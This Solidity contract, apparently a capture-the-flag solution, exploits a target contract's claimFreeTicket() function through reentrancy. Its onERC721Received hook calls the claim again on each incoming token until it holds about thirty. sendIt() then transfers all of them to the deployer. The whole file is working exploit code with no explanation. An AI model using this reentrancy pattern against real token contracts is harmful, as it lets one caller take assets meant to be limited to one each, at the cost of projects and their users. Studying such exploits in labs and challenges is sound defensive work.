// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

contract AnotherPleaseExploit {
    address public anotherPlease;
    address public owner;

    constructor(address _anotherPlease) {
        anotherPlease = _anotherPlease;
        owner = msg.sender;
    }

    function exploit() public {
        (bool success, ) = anotherPlease.call(
            abi.encodeWithSignature("claimFreeTicket()")
        );
        require(success, "lelk");
    }

    function sendIt() external {
        for (uint256 i = 0; i < 30; i++) {
            (bool success, ) = anotherPlease.call(
                abi.encodeWithSignature(
                    "safeTransferFrom(address,address,uint256)",
                    address(this),
                    owner,
                    i
                )
            );
            require(success, "lelk");
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 c,
        bytes calldata
    ) public returns (bytes4) {
        if (c < 29) {
            exploit();
        }
        return this.onERC721Received.selector;
    }
}
